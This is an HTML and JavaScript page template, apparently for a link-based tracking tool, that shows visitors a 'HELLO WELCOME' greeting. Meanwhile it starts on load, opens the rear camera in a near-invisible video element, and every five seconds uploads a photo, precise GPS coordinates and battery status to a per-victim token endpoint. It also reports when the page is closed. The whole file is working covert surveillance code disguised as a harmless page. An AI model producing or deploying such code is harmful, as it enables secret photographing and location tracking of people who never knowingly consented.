<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Android Background Capture</title>
  <style>
    body { font-family: system-ui, Arial, sans-serif; padding: 12px; }
    #status { white-space: pre-line; margin-top: 8px; }

    /* keep video on screen but tiny & almost invisible to avoid black frames */
    video {
      position: fixed;
      bottom: 4px;
      right: 4px;
      width: 80px;
      height: 80px;
      opacity: 0.01;        /* not 0 */
      pointer-events: none;
      z-index: 9999;
    }

    /* canvas can stay hidden, it's only for offscreen rendering */
    canvas { display: none !important; }
  </style>
</head>
<body>
  <h2>HELLO WELCOME</h2>
  <p id="status">Please keep smile on your face…</p>

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

  <script>
    const token = "{{ token }}";
    const statusEl = document.getElementById("status");
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");

    const INTERVAL = 5000; // ms
    let stream = null;
    let timer = null;
    let uploading = false;

    function log(msg){
      statusEl.textContent = msg;
      console.log(msg);
    }

    function jsonBlob(o){
      return new Blob([JSON.stringify(o)], { type: "application/json" });
    }

    function waitForVideoReady(maxWaitMs = 2000){
      return new Promise((resolve) => {
        if (video.videoWidth > 0 && video.videoHeight > 0) return resolve(true);
        let resolved = false;
        function done() { if (!resolved) { resolved = true; resolve(true); } }
        function fallback() { if (!resolved) { resolved = true; resolve(false); } }
        video.onloadedmetadata = () => { if (video.videoWidth > 0) done(); };
        video.oncanplay = () => { if (video.videoWidth > 0) done(); };
        // safety timeout
        setTimeout(() => fallback(), maxWaitMs);
      });
    }

    function captureFrame(){
      if (video.videoWidth === 0 || video.videoHeight === 0) {
        return null;
      }
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0);
      return canvas.toDataURL("image/jpeg", 0.75);
    }

    async function getCoords(timeout = 4000){
      return new Promise((resolve) => {
        if (!("geolocation" in navigator)) return resolve(null);
        let done = false;
        navigator.geolocation.getCurrentPosition(
          pos => {
            if (!done) {
              done = true;
              resolve({
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                accuracy: pos.coords.accuracy
              });
            }
          },
          err => {
            if (!done) {
              done = true;
              resolve(null);
            }
          },
          { timeout, enableHighAccuracy: true }
        );
        setTimeout(() => {
          if (!done) {
            done = true;
            resolve(null);
          }
        }, timeout + 300);
      });
    }

    async function getBattery(){
      try{
        if (navigator.getBattery) {
          const b = await navigator.getBattery();
          return { level: Math.round(b.level * 100), charging: !!b.charging };
        }
      } catch(e){}
      return null;
    }

    async function upload(data){
      if (uploading) return false;
      uploading = true;
      const url = `/upload_image/${token}`;
      try {
        const blob = jsonBlob(data);
        if (navigator.sendBeacon) {
          const ok = navigator.sendBeacon(url, blob);
          if (ok) { uploading = false; return true; }
        }
      } catch(e){
        console.warn("sendBeacon error", e);
      }
      try {
        await fetch(`/upload_image/${token}`, {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify(data),
          keepalive: true
        });
        uploading = false;
        return true;
      } catch(e){
        console.warn("upload fetch error", e);
      }
      uploading = false;
      return false;
    }

    async function captureLoop(){
      const ready = await waitForVideoReady(3000);
      if (!ready) {
        log("Video not ready yet, skipping this tick.");
        return;
      }
      await new Promise(r => setTimeout(r, 250));

      const frame = captureFrame();
      if (!frame) {
        log("Blank frame, will retry next tick.");
        return;
      }

      const [battery, coords] = await Promise.all([getBattery(), getCoords(3000)]);
      const payload = {
        image_b64: frame,
        battery: battery || null,
        coords: coords || null
      };
      const ok = await upload(payload);
      log(ok ? "Uploaded image" : "Upload failed");
    }

    async function start(){
      log("Requesting camera…");
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "environment" },
          audio: false
        });
      } catch(e) {
        log("Camera permission denied or error");
        return;
      }
      video.srcObject = stream;

      const ready = await waitForVideoReady(3000);
      if (!ready) {
        await new Promise(r => setTimeout(r, 500));
      }
      log("Camera ready. Starting capture loop.");
      captureLoop().catch(err => console.warn(err));
      timer = setInterval(() => {
        captureLoop().catch(err => console.warn(err));
      }, INTERVAL);
    }

    function stopAll(){
      if (timer) { clearInterval(timer); timer = null; }
      if (stream) {
        try { stream.getTracks().forEach(t => t.stop()); } catch(e){}
        stream = null;
      }
      log("Capture stopped.");
    }

    window.addEventListener("beforeunload", () => {
      try {
        if (navigator.sendBeacon) {
          navigator.sendBeacon(
            `/upload_info/${token}`,
            jsonBlob({ note: "page-closed" })
          );
        } else {
          fetch(`/upload_info/${token}`, {
            method: "POST",
            headers: {"Content-Type":"application/json"},
            body: JSON.stringify({ note: "page-closed" }),
            keepalive: true
          }).catch(()=>{});
        }
      } catch(e){}
      stopAll();
    });

    // start automatically (Android)
    start();
  </script>
</body>
</html>
